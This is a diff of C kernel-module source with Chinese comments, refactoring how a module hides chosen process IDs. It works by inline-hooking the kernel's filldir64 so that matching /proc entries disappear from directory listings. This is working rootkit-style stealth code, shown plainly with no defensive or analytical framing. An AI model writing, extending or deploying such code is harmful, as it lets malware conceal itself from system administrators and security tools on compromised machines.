@@ -50,31 +50,6 @@ static bool hide_process_has_pid(void)
     return false;
 }
 
-// 添加一个需要隐藏的 PID：已存在则复用，表满返回 -ENOSPC。
-static int hide_process_add_pid(pid_t pid)
-{
-    int i, empty = -1;
-
-    if (pid <= 0)
-        return -EINVAL;
-
-    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
-    {
-        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
-
-        if (hidden_pid == pid)
-            return 0;
-        if (!hidden_pid && empty < 0)
-            empty = i;
-    }
-
-    if (empty < 0)
-        return -ENOSPC;
-
-    WRITE_ONCE(g_hidden_pids[empty], pid);
-    return 0;
-}
-
 // filldir64 没有 struct file 参数，无法确认当前目录是否为 /proc；这里用 DT_DIR + 精确 PID 名字匹配。
 static bool hide_process_match_pid_name(const char *name, int namlen, unsigned int d_type)
 {
@@ -127,6 +102,7 @@ static int hide_process_install(pid_t pid)
 {
     unsigned long filldir64_addr;
     int ret = 0;
+    int i, empty = -1;
 
     if (pid <= 0)
         return -EINVAL;
@@ -159,24 +135,46 @@ static int hide_process_install(pid_t pid)
         goto out_unlock;
 
     // hook 安装成功后再写隐藏表，避免表里有 PID 但拦截点没生效。
-    ret = hide_process_add_pid(pid);
-    if (ret)
+    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    {
+        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
+
+        if (hidden_pid == pid)
+            goto out_unlock;
+        if (!hidden_pid && empty < 0)
+            empty = i;
+    }
+
+    if (empty < 0)
+    {
+        ret = -ENOSPC;
         goto out_unlock;
+    }
+
+    WRITE_ONCE(g_hidden_pids[empty], pid);
 
 out_unlock:
     mutex_unlock(&g_hide_process_lock);
     return ret;
 }
 
-// 卸载 hook。
-static void hide_process_remove(void)
+// 删除一个隐藏 PID；如果隐藏表已经空了，就卸载 filldir64 hook。
+static void hide_process_remove(pid_t pid)
 {
     int i;
 
+    if (pid <= 0)
+        return;
+
     mutex_lock(&g_hide_process_lock);
-    inline_hook_remove(g_filldir64_hook);
     for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
-        WRITE_ONCE(g_hidden_pids[i], 0);
+    {
+        if (READ_ONCE(g_hidden_pids[i]) == pid)
+            WRITE_ONCE(g_hidden_pids[i], 0);
+    }
+
+    if (!hide_process_has_pid())
+        inline_hook_remove(g_filldir64_hook);
     mutex_unlock(&g_hide_process_lock);
 }
 
